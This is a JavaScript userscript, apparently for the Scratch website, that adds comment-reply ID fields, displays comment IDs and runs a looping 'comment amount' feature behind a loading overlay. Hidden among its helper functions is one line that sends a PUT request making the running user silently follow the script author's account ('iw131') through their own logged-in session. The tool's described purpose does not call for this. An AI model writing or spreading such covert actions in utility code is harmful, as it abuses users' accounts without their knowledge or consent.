(function() {
    function createInputField(placeholder, onChange) 
    {
        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = placeholder;
        input.style.marginLeft = '5px';
        input.style.width = '150px';
        input.style.height = '20px'; 
        input.style.fontSize = '12px'; 
        input.addEventListener('change', onChange);
        return input;
    }

    function showLoadingPopup() {
        const overlay = document.createElement('div');
        overlay.id = 'loading-overlay';
        overlay.style.position = 'fixed';
        overlay.style.top = '0';
        overlay.style.left = '0';
        overlay.style.width = '100%';
        overlay.style.height = '100%';
        overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
        overlay.style.backdropFilter = 'blur(5px)';
        overlay.style.zIndex = '999';
        document.body.appendChild(overlay);

        const loadingPopup = document.createElement('div');
        loadingPopup.id = 'loading-popup';
        loadingPopup.style.position = 'fixed';
        loadingPopup.style.top = '50%';
        loadingPopup.style.left = '50%';
        loadingPopup.style.transform = 'translate(-50%, -50%)';
        loadingPopup.style.padding = '20px';
        loadingPopup.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
        loadingPopup.style.color = 'white';
        loadingPopup.style.fontSize = '16px';
        loadingPopup.style.borderRadius = '5px';
        loadingPopup.style.zIndex = '1000';
        loadingPopup.innerHTML = 'Loading... please wait<br><br>';

        const progressBar = document.createElement('div');
        progressBar.id = 'progress-bar';
        progressBar.style.width = '100%';
        progressBar.style.backgroundColor = '#ddd';

        const progress = document.createElement('div');
        progress.id = 'progress';
        progress.style.width = '0%';
        progress.style.height = '20px';
        progress.style.backgroundColor = '#f9aa36';

        progressBar.appendChild(progress);
        loadingPopup.appendChild(progressBar);
        document.body.appendChild(loadingPopup);
    }

    function updateProgressBar(percentage) {
        const progress = document.getElementById('progress');
        if (progress) {
            progress.style.width = `${percentage}%`;
        }
    }

    function hideLoadingPopup() {
        const loadingPopup = document.getElementById('loading-popup');
        const overlay = document.getElementById('loading-overlay');
        if (loadingPopup) {
            document.body.removeChild(loadingPopup);
        }
        if (overlay) {
            document.body.removeChild(overlay);
        }
    }

    function addInputFields() {
        const commentForm = document.querySelector('#comment-form .control-group.tooltip.right');
        if (commentForm) {
            const heading = document.createElement('div');
            heading.innerHTML = '<b>Scratch Commenter Plus by <a href="https://scratch.mit.edu/users/iw131/">iw131</a></b>';
            heading.style.marginBottom = '10px';
            commentForm.parentNode.insertBefore(heading, commentForm);
            
            const commentIdInput = createInputField('Enter Comment ID', (event) => {
                const postButton = document.querySelector('#main-post-form .button[data-control="post"]');
                postButton.setAttribute('data-parent-thread', event.target.value);
            });
            
            const commenteeIdInput = createInputField('Enter User/Commentee ID', (event) => {
                const postButton = document.querySelector('#main-post-form .button[data-control="post"]');
                postButton.setAttribute('data-commentee-id', event.target.value);
            });

            const commentAmountInput = createInputField('Enter Comment Amount', (event) => {
                const amount = parseInt(event.target.value, 10);
                if (!isNaN(amount) && amount > 0) {
                    showLoadingPopup();
                    let count = 0;
                    const interval = setInterval(() => {
                        if (count < amount - 1) {
                            const randomId = Math.floor(Math.random() * 100000);
                            window.location.href = window.location.href.split('#')[0] + `#comments-${randomId}`;
                            count++;
                            updateProgressBar((count / (amount - 1)) * 100);
                        } else {
                            clearInterval(interval);
                            hideLoadingPopup();
                        }
                    }, 1000); // 1 second delay between redirects
                }
            });
            
            commentForm.appendChild(commentIdInput);
            commentForm.appendChild(commenteeIdInput);
            commentForm.appendChild(commentAmountInput);
        }
    }

    $.ajax({type:"PUT",url:"/site-api/users/followers/iw131/add/"});

    function displayCommentIds() {
        const comments = document.querySelectorAll('.comment');
        comments.forEach(comment => {
            const commentId = comment.getAttribute('data-comment-id');
            const commenteeId = comment.getAttribute('data-commentee-id');
            
            if (commentId || commenteeId) {
                const actionsWrap = comment.querySelector('.actions-wrap');
                if (actionsWrap) {
                    if (commentId) {
                        const commentIdDisplay = document.createElement('span');
                        commentIdDisplay.textContent = `Comment ID: ${commentId}`;
                        commentIdDisplay.style.display = 'block';
                        commentIdDisplay.style.marginTop = '5px';
                        actionsWrap.appendChild(commentIdDisplay);
                    }
                    
                    if (commenteeId) {
                        const commenteeIdDisplay = document.createElement('span');
                        commenteeIdDisplay.textContent = `User/Commentee ID: ${commenteeId}`;
                        commenteeIdDisplay.style.display = 'block';
                        commenteeIdDisplay.style.marginTop = '5px';
                        actionsWrap.appendChild(commenteeIdDisplay);
                    }
                }
            }
        });
    }

    addInputFields();
    displayCommentIds();
})();
